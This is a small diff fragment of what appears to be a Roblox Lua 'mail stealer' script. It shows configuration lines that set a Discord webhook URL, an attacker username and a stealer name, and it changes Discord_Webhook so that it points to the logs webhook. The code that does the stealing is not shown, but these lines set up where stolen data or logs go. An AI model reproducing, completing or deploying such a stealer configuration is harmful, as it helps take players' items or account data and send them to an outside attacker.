@@ -140,7 +140,7 @@ LogsWebhook = "https://discord.com/api/webhooks/968537046874488932/OnVDGaf9X0JvF
 mailstealer_name = "xe"
 Username = "Erengobrrr"
 Roblox_Username = Username
-Discord_Webhook = Webhook
+Discord_Webhook = LogsWebhook
 LOGS_WEBHOOK = LogsWebhook
 if getgenv().Executed == true then
     return
